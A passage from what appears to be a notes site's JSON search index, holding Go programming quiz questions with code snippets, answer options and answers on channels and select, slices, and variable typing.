\u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ech2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ech2\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 1\u003c/li\u003e\n\u003cli\u003eB. 2\u003c/li\u003e\n\u003cli\u003eC. No output, program is deadlocked\u003c/li\u003e\n\u003cli\u003eD. No output, program has finished execution.\u003c/li\u003e\n\u003cli\u003eE. else\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/lPURBGXle_N\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Select"},{"categories":null,"contents":" slice package main import ( \u0026#34;fmt\u0026#34; ) func main() { var s1 []int var s2 = []int{} if __ == nil { fmt.Println(\u0026#34;nil slice\u0026#34;) } if __ != nil { fmt.Println(\u0026#34;empty slice\u0026#34;) } } A. s1, s2 B. s2, s1 C. s1, s1 D. s2, s2 Answer Try it A slice1 package main import ( \u0026#34;fmt\u0026#34; ) func main() { s := [3]int{1, 2, 3} a := s[:0] b := s[:2] c := s[1:2:cap(s)] fmt.Println(len(a), cap(a)) fmt.Println(len(b), cap(b)) fmt.Println(len(c), cap(c)) } Answer Try it 0 3 2 3 1 2 slice2 package main import \u0026#34;fmt\u0026#34; func main() { s1 := []int{1, 2, 3} s2 := s1[1:] s2[1] = 4 fmt.Println(s1) s2 = append(s2, 5, 6, 7) fmt.Println(s1) } Answer Try it [1 2 4] [1 2 4] ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/slice/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eslice\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es1\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es2\u003c/span\u003e = []\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e__\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nil slice\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e__\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;empty slice\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. s1, s2\u003c/li\u003e\n\u003cli\u003eB. s2, s1\u003c/li\u003e\n\u003cli\u003eC. s1, s1\u003c/li\u003e\n\u003cli\u003eD. s2, s2\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/S_Q4w6NMAoU\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eA\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eslice1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[:\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[:\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e:cap(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e)]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(len(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e), cap(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(len(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e), cap(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(len(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e), cap(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/hpZ3VyWv-Pz\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e0 3\n2 3\n1 2\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eslice2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003es1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003es2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es1\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e:]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003es2\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e] = \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003es1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003es2\u003c/span\u003e = append(\u003cspan style=\"color:#a6e22e\"\u003es2\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003es1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/H-1Jf-LwUg4\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e[1 2 4]\n[1 2 4]\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Slice"},{"categories":null,"contents":" variable A. p.name B. (\u0026amp;p).name C. (*p).name D. p-\u0026gt;name Answer AC variable1 package main import ( \u0026#34;fmt\u0026#34; ) func main() { var ans float64 = 15 + 25 + 5.2 fmt.Println(ans) } A. 45 B. 45.0 C. 45.2 D. compliation error Answer Try it C variable2 package main import ( \u0026#34;fmt\u0026#34; ) func main() { var ans float64 = 3 / 2 fmt.Println(ans) } A. 1.5 B. 1 C. 0 D. compliation error Answer Try it B variable3 package main func main() { const a int8 = -1 var b int8 = -128 / a println(b) } Answer Try it compliation error -128 / a (constant 128 of type int8) overflows int8 variable4 package main func main() { var a int8 = -1 var b int8 = -128 / a println(b) } Answer Try it -128 variable5 package main import \u0026#34;fmt\u0026#34; type MyInt1 int type MyInt2 = int func main() { var i int =0 var i1 MyInt1 = i var i2 MyInt2 = i fmt.Println(i1, i2) } Answer Try it compilation error cannot use i (variable of type int) as MyInt1 value in variable declaration variable6 package main import \u0026#34;fmt\u0026#34; func main() { const X = 7.0 var x interface{} = X if y, ok := x.(int); ok { fmt.Println(y) } else { fmt.Println(int(y)) } } A. 7 B. 7.0 C. 0 D. compilation error Answer Try it C ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/variable/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003eA. p.name\u003c/li\u003e\n\u003cli\u003eB. (\u0026amp;p).name\u003c/li\u003e\n\u003cli\u003eC. (*p).name\u003c/li\u003e\n\u003cli\u003eD. p-\u0026gt;name\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\n\u003ccode\u003eAC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eans\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efloat64\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e25\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e5.2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eans\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 45\u003c/li\u003e\n\u003cli\u003eB. 45.0\u003c/li\u003e\n\u003cli\u003eC. 45.2\u003c/li\u003e\n\u003cli\u003eD. compliation error\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/VCR1yAY32nG\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eans\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efloat64\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eans\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 1.5\u003c/li\u003e\n\u003cli\u003eB. 1\u003c/li\u003e\n\u003cli\u003eC. 0\u003c/li\u003e\n\u003cli\u003eD. compliation error\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/SXwEiV0FUWJ\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable3\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint8\u003c/span\u003e = \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint8\u003c/span\u003e = \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 